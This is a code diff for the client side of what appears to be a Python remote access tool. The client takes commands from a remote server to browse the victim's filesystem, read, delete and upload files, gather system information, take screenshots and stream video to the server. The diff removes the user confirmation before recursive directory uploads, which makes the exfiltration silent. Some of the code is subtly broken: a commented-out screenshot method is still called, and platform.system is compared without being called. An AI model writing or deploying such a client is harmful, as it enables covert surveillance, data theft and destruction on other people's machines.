@@ -5,16 +5,13 @@ import os.path as path
 from pprint import pprint
 import colorama 
 import subprocess,socket,sys
-import string,psutil,datetime
+import psutil,threading
 import platform
 from tabulate import tabulate
 from colorama import Fore,Style
-import pyautogui
 colorama.init()
 import socket
-import io
-from PIL import ImageGrab
-import PIL
+from vidstream import VideoClient
 
 HEADER       =  2048 
 PORT         =  5050
@@ -112,7 +109,7 @@ def writetofile(error:str):
 
 
 
-class FileDialog:
+class Main:
     def __init__(self):
         self.commands =[["[file] --remove","deletes the selected file"],["[file] --read","prints the contents of the file"],["[file] --upload",'uploads the selected file to your machine']]
 
@@ -124,7 +121,8 @@ class FileDialog:
         except Exception as e:
             writetofile(e)
 
-
+    """
+    ISNT DONE YET
     def takescreenshot(self):
         screenshot = screenshot = ImageGrab.grab()
         screenshot_bytes = screenshot.tobytes()
@@ -141,7 +139,13 @@ class FileDialog:
         except Exception as e:
             print(e)
             writetofile(e)
-
+    """
+    def startstream(self,path):
+        try:
+            cl = VideoClient(SERVER, 9999,path)
+            cl.start_stream()
+        except Exception as e:
+            writetofile(e)
     def removemanager(self,filepath):
         if os.path.isfile(filepath):
             self.removefile(filepath)
@@ -166,11 +170,10 @@ class FileDialog:
     def manageupload(self,filepath):
         try:    
             if path.isdir(filepath):
-                r = input("this will upload all file and subdirs in the directory that you selected do you want to proceed [y,n]?").lower()
-                if r =='y':
-                    for file in os.listdir(filepath):
-                        floader = path.join(filepath,file)
-                        self.manageupload(floader)
+                for file in os.listdir(filepath):
+                    floader = path.join(filepath,file)
+                    self.manageupload(floader)
+                send_msg("conf-- Files are flowing")
             else:
                 self.uploadfile(filepath)
 
@@ -227,15 +230,15 @@ class FileDialog:
             help.append([Fore.RED +"[file or dir] --remove"+ Style.RESET_ALL, Fore.RED + "--remove: deletes the choosen file or dir" + Style.RESET_ALL])
             
 
-
-            help_table = tabulate(help, headers=["command", "description"], tablefmt="fancy_grid")
-            print(help_table)
-            input("press anything to returns to the file manager")
+            send_msg(str(f"help_list--{help}"))
             self.searchfiles(os.path.dirname(filepath))
 
         elif cmd == "upload" and ENDPOINT != None:
             self.manageupload(filepath)
             self.searchfiles(os.path.dirname(filepath))
+
+        elif cmd == "play":
+            self.startstream(filepath)
 
         elif cmd == "read":
             self.readfile(filepath)
@@ -245,7 +248,7 @@ class FileDialog:
             if path.isdir(filepath):
                 self.searchfiles(filepath)
             else:
-                print("you cant walk a file it must be a dir")
+                send_msg("war--you cant walk a file it must be a dir")
                 time.sleep(2)
                 self.searchfiles(os.path.dirname(filepath))
 
@@ -307,7 +310,7 @@ class FileDialog:
 
 
 
-APP = FileDialog()
+APP = Main()
 
 
 
@@ -315,15 +318,8 @@ APP = FileDialog()
 
 
             
-def exp():
-    print("command recived")
-    if platform.system == "Linux":
-        try:
-            APP.searchfiles('/')
-        except Exception as e:
-            writetofile(e)
-    else:
-        APP.searchfiles(os.path.expanduser("~"))
+
+   
 
 
 while True:
@@ -332,7 +328,14 @@ while True:
         try:
             print(msg)
             if msg == "explore":
-                exp()
+                    print("command recived")
+                    if platform.system == "Linux":
+                        try:
+                            APP.searchfiles('/')
+                        except Exception as e:
+                            writetofile(e)
+                    else:
+                        APP.searchfiles(os.path.expanduser("~"))
 
             elif msg == "gather_info":
                 try:
@@ -341,8 +344,9 @@ while True:
                     writetofile(e)
             
             elif msg == "screenshot":
-                print("captured")
                 APP.takescreenshot()
+
+            
         
                 pass 
             else:
